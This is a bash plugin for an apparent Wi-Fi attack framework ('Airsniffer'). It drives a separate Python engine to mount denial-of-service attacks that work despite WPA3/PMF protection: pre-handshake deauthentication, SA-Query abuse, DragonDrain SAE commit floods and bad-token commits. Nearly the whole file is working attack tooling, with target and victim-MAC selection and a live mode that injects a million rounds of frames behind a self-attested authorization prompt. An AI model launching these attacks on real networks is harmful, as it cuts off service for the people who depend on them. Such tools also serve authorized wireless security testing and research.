#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### Airsniffer plugin: PMF-bypass DoS ######
#
# Classic deauth stops working once PMF (802.11w) is in force, and WPA3 makes
# PMF mandatory. This plugin drives pmf_dos_engine.py, which implements the DoS
# techniques that keep working against WPA3/PMF networks:
#
#   * prehandshake - deauth/disassoc in the (re)association window, before the
#                    PTK is installed (PMF only protects post-key-install).
#   * saquery      - unprotected mgmt frames to exercise inconsistent SA-Query
#                    handling (Schepers, Ranganathan, Vanhoef, WiSec 2022).
#   * dragondrain  - SAE Commit flood from spoofed MACs to exhaust AP CPU
#                    (Vanhoef & Ronen 2019); no deauth needed.
#   * badtoken     - SAE Commit with invalid anti-clogging tokens
#                    (Lounis & Zulkernine 2019).
#
# SIMULATION (default) logs what would be sent and transmits nothing. LIVE
# injects real frames and is gated behind an authorization prompt + a confirmed
# target. All engine args are passed as an array (spaced SSIDs stay intact).
#
# AUTHORIZED USE ONLY.

###### GENERIC PLUGIN VARS ######

plugin_name="PMF-bypass DoS"
plugin_description="WPA3/PMF-resistant DoS: pre-handshake deauth, SA-Query, DragonDrain and Bad-Token (sim + live)"
plugin_author="Airsniffer"

plugin_enabled=1
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)/airsniffer_ui.sh" 2> /dev/null || true

###### PLUGIN REQUIREMENTS ######

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

###### WPA3 MENU REGISTRATION ######

pmf_dos_menu_string_id=9150

pmf_dos_plugin_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)"
pmf_dos_engine="${pmf_dos_plugin_dir}/pmf_dos_engine.py"

#Session state.
pmf_dos_mode="simulate"          # simulate | live
pmf_dos_strategy="prehandshake"  # prehandshake | saquery | dragondrain | badtoken
pmf_dos_sta_mac=""               # victim client MAC (needed by prehandshake/saquery/badtoken)
pmf_dos_count=64
pmf_dos_authorized=0

pmf_dos_register_labels() {
	local lang
	local label="PMF-bypass DoS (pre-handshake / SA-Query / DragonDrain / Bad-Token) *"
	for lang in ENGLISH SPANISH FRENCH CATALAN PORTUGUESE RUSSIAN GREEK ITALIAN POLISH GERMAN TURKISH ARABIC CHINESE; do
		arr["${lang}",${pmf_dos_menu_string_id}]="${label}"
	done
}
pmf_dos_register_labels

plugin_wpa3_menu_option_function="pmf_dos_menu"
plugin_wpa3_menu_option_language_string="${pmf_dos_menu_string_id}"

###### HELPERS ######

pmf_dos_title() {
	as_ui_header "${1}"
}

pmf_dos_pause() {
	as_ui_pause
}

pmf_dos_python() {
	if command -v python3 > /dev/null 2>&1; then echo "python3"
	elif command -v python > /dev/null 2>&1; then echo "python"
	else echo ""; fi
}

pmf_dos_valid_mac() {
	[[ "${1}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

#Strategies that need a specific victim STA MAC.
pmf_dos_needs_sta() {
	case "${pmf_dos_strategy}" in
		prehandshake|saquery|badtoken) return 0 ;;
		*) return 1 ;;
	esac
}

pmf_dos_authorization_gate() {
	if [ "${pmf_dos_authorized}" -eq 1 ]; then return 0; fi
	echo
	echo -e "${red_color}LIVE MODE - AUTHORIZED TESTING ONLY${normal_color}"
	echo -e "${yellow_color}Live mode injects real frames and disrupts service. Only run it against"
	echo -e "a network you own or are explicitly authorized to test.${normal_color}"
	echo
	read -rp "$(echo -e "${green_color}Do you have authorization for this target? [y/N]: ${normal_color}")" _auth
	case "${_auth}" in
		y|Y|yes|YES) pmf_dos_authorized=1; return 0 ;;
		*) echo; echo -e "${red_color}Aborted. Authorization is required.${normal_color}"; return 1 ;;
	esac
}

###### SETUP (reuses Airsniffer core) ######

pmf_dos_select_interface() {
	select_interface
	pmf_dos_pause
}

pmf_dos_ensure_monitor() {
	if [ -z "${interface}" ]; then
		echo; echo -e "${red_color}No interface selected.${normal_color} Use option 1 first."; pmf_dos_pause; return 1
	fi
	if [ "${ifacemode}" = "Monitor" ]; then
		echo; echo -e "${green_color}${interface} already in monitor mode.${normal_color}"; pmf_dos_pause; return 0
	fi
	echo; echo -e "${yellow_color}Putting ${interface} into monitor mode...${normal_color}"
	monitor_option "${interface}"
	pmf_dos_pause
}

pmf_dos_select_target() {
	if [ -z "${interface}" ]; then
		echo; echo -e "${red_color}No interface selected.${normal_color} Use option 1 first."; pmf_dos_pause; return 1
	fi
	if [ "${ifacemode}" != "Monitor" ]; then
		echo -e "${yellow_color}Enabling monitor mode first...${normal_color}"
		monitor_option "${interface}" || { pmf_dos_pause; return 1; }
	fi
	explore_for_targets_option "WPA3"
	[ -n "${bssid}" ] && echo -e "${green_color}Target locked:${normal_color} ${essid:-<hidden>} (${bssid}, ch ${channel})"
	pmf_dos_pause
}

pmf_dos_set_sta_mac() {
	local mac
	read -rp "$(echo -e "${green_color}Victim client MAC (AA:BB:CC:DD:EE:FF, blank to clear): ${normal_color}")" mac
	if [ -z "${mac}" ]; then
		pmf_dos_sta_mac=""; echo -e "${yellow_color}Cleared.${normal_color}"
	elif pmf_dos_valid_mac "${mac}"; then
		pmf_dos_sta_mac="${mac}"; echo -e "${green_color}Victim STA set:${normal_color} ${pmf_dos_sta_mac}"
	else
		echo -e "${red_color}Invalid MAC format.${normal_color} Not changed."
	fi
	pmf_dos_pause
}

###### RUN ######

pmf_dos_run() {
	local py; py="$(pmf_dos_python)"
	if [ -z "${py}" ]; then echo -e "${red_color}Python 3 not found.${normal_color}"; pmf_dos_pause; return; fi
	if [ ! -f "${pmf_dos_engine}" ]; then echo -e "${red_color}Engine not found:${normal_color} ${pmf_dos_engine}"; pmf_dos_pause; return; fi

	if [ -z "${bssid}" ]; then
		if [ "${pmf_dos_mode}" = "live" ]; then
			echo -e "${red_color}No target locked.${normal_color} Use option 3 first."; pmf_dos_pause; return
		fi
		echo -e "${yellow_color}No target locked - simulating with placeholder values.${normal_color}"
	fi

	#Strategies that target a specific STA need its MAC.
	if pmf_dos_needs_sta && [ -z "${pmf_dos_sta_mac}" ]; then
		if [ "${pmf_dos_mode}" = "live" ]; then
			echo -e "${red_color}Strategy '${pmf_dos_strategy}' needs a victim STA MAC.${normal_color} Set it (option 7)."; pmf_dos_pause; return
		fi
		echo -e "${yellow_color}No victim STA set - simulating toward a placeholder MAC.${normal_color}"
	fi

	local outdir="${tmpdir:-/tmp/}pmf_dos"
	mkdir -p "${outdir}" 2> /dev/null

	local args=(
		"${pmf_dos_engine}"
		--strategy "${pmf_dos_strategy}"
		--mode "${pmf_dos_mode}"
		--iface "${interface:-wlan0mon}"
		--ap-mac "${bssid:-AA:AA:AA:AA:AA:AA}"
		--sta-mac "${pmf_dos_sta_mac:-BB:BB:BB:BB:BB:BB}"
		--ssid "${essid:-TARGET_SSID}"
		--channel "${channel:-1}"
		--count "${pmf_dos_count}"
		--logdir "${outdir}"
	)

	if [ "${pmf_dos_mode}" = "live" ]; then
		if ! pmf_dos_authorization_gate; then pmf_dos_pause; return; fi
		if [ -z "${interface}" ] || [ "${ifacemode}" != "Monitor" ]; then
			echo -e "${red_color}Live mode needs a monitor-mode interface.${normal_color} Use options 1-2."; pmf_dos_pause; return
		fi
		echo -e "${yellow_color}Setting ${interface} to channel ${channel}...${normal_color}"
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		recalculate_windows_sizes 2> /dev/null
		local live_cmd
		printf -v live_cmd '%q ' "${py}" "${args[@]}" --repeat 1000000 --interval 0.05
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -T \"PMF DoS (${pmf_dos_strategy})\"" \
			"${live_cmd}" "PMF DoS (${pmf_dos_strategy})"
		echo -e "${green_color}Live ${pmf_dos_strategy} launched.${normal_color} Close its window to stop. Log: ${outdir}"
	else
		echo -e "${blue_color}Running SIMULATION (nothing transmitted)...${normal_color}"
		echo
		"${py}" "${args[@]}"
		echo
		echo -e "${green_color}Simulation log:${normal_color} ${outdir}"
	fi
	pmf_dos_pause
}

###### SUBMENU ######

pmf_dos_menu() {

	while true; do
		clear
		pmf_dos_title "PMF-bypass DoS - WPA3/PMF-resistant denial of service"

		if [ "${ifacemode}" = "Monitor" ]; then
			as_ui_kv "Interface" "${interface:-<none>} [Monitor]" ok
		else
			as_ui_kv "Interface" "${interface:-<none>} [${ifacemode:-Managed}]" warn
		fi
		if [ -n "${bssid}" ]; then
			as_ui_kv "Target AP" "${essid:-<hidden>} (${bssid}, ch ${channel})" ok
		else
			as_ui_kv "Target AP" "<none - lock a target>" err
		fi
		if [ "${pmf_dos_mode}" = "live" ]; then
			as_ui_kv "Mode" "live   Strategy: ${pmf_dos_strategy}   Count: ${pmf_dos_count}" err
		else
			as_ui_kv "Mode" "simulate   Strategy: ${pmf_dos_strategy}   Count: ${pmf_dos_count}" ok
		fi
		if pmf_dos_needs_sta; then
			if [ -n "${pmf_dos_sta_mac}" ]; then
				as_ui_kv "Victim STA" "${pmf_dos_sta_mac}" ok
			else
				as_ui_kv "Victim STA" "<none - set via option 7>" err
			fi
		fi
		echo
		as_ui_sep
		as_ui_item 0 "Return to the WPA3 attacks menu"
		as_ui_section "Setup / target"
		as_ui_item 1 "Select wireless interface"
		as_ui_item 2 "Put adapter in monitor mode (if not already)"
		as_ui_item 3 "Explore for targets & lock target"
		as_ui_section "Attack"
		as_ui_item 4 "Run selected strategy"
		as_ui_item 5 "Cycle strategy (prehandshake/saquery/dragondrain/badtoken)"
		as_ui_item 6 "Toggle mode (simulate <-> live)"
		as_ui_item 7 "Set victim client MAC"
		as_ui_item 8 "Set frame count per pass"
		echo

		read -rp "> " pmf_option
		case "${pmf_option}" in
			0) return ;;
			1) pmf_dos_select_interface ;;
			2) pmf_dos_ensure_monitor ;;
			3) pmf_dos_select_target ;;
			4) pmf_dos_run ;;
			5)
				case "${pmf_dos_strategy}" in
					prehandshake) pmf_dos_strategy="saquery" ;;
					saquery) pmf_dos_strategy="dragondrain" ;;
					dragondrain) pmf_dos_strategy="badtoken" ;;
					*) pmf_dos_strategy="prehandshake" ;;
				esac
			;;
			6)
				if [ "${pmf_dos_mode}" = "simulate" ]; then pmf_dos_mode="live"; else pmf_dos_mode="simulate"; fi
			;;
			7) pmf_dos_set_sta_mac ;;
			8)
				read -rp "$(echo -e "${green_color}Frames per pass [current ${pmf_dos_count}]: ${normal_color}")" _cnt
				if [[ "${_cnt}" =~ ^[0-9]+$ ]] && [ "${_cnt}" -gt 0 ]; then pmf_dos_count="${_cnt}"; else echo -e "${red_color}Invalid.${normal_color}"; sleep 1; fi
			;;
			*) echo -e "${red_color}Invalid option.${normal_color}"; sleep 1 ;;
		esac
	done
}
